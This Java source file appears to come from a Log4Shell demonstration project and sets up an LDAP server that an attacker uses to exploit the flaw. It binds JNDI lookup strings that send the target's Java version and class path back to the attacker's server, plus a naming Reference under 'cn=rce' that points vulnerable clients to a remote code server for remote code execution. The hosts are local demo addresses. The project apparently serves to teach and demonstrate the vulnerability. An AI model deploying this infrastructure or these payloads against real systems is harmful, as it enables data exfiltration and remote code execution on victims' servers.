package com.sonatype.demo.log4shelldemo.helpers;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.LinkedList;
import java.util.List;

public class LdapServerUploader {

    private Context ctx;
    private String ldapserver;
    private String refserver;

    public LdapServerUploader() throws NamingException {

        if(DockerEnvironment.inDockerContainer) {
            ldapserver="ldap://ldap.dev:1389";
            refserver="http://server.dev:8080";
        }
        else {
            ldapserver="ldap://localhost:1389";
            refserver="http://localhost:8080";

        }
        Hashtable<String, Object> env = new Hashtable<String, Object>();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, ldapserver);
       ctx = new InitialContext(env);



    }

    public static void upload(String key, Object o) {
        LdapServerUploader l= null;
        try {
            l = new LdapServerUploader();
            l.install(key,o);
        } catch (NamingException e) {
            e.printStackTrace();
        }

    }

    private void install(String key, Object o) {
        try {
            ctx.bind(key,o);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }


    public void addObjects() throws NamingException {


            HashMap m =  new HashMap<>();
            m.put("key is $${sys:java.version}","${sys:java.version}");
            List<String> list=new LinkedList<>();
            list.add("this");
             list.add("is");
            list.add("a");
            list.add("nested");
            list.add("list");
            m.put("gadget-chain",list);
            ctx.bind("cn=gadget", m);

            ctx.bind("cn=version","${jndi:"+ldapserver+"/echo/${sys:java.version}}");


            ctx.bind("cn=thankyou","thanks for your data");
        ctx.bind("cn=template","${jndi:"+ldapserver+"/server-data/${sys:java.class.path}//${sys:java.version}//ID1}");
        ctx.bind("cn=getversion","${jndi:"+ldapserver+"/version/${sys:java.version}//ID1}");
        ctx.bind("cn=getclasspath","${jndi:"+ldapserver+"/classpath/${sys:java.class.path}/}");
        ctx.bind("cn=saythankyou","thank you for your data");
        ctx.bind("cn=404","nope - no idea");

        Reference ref = new Reference("ExternalObject","ExternalObject",refserver+"/code/");
        ctx.bind("cn=rce",ref);
    }
}
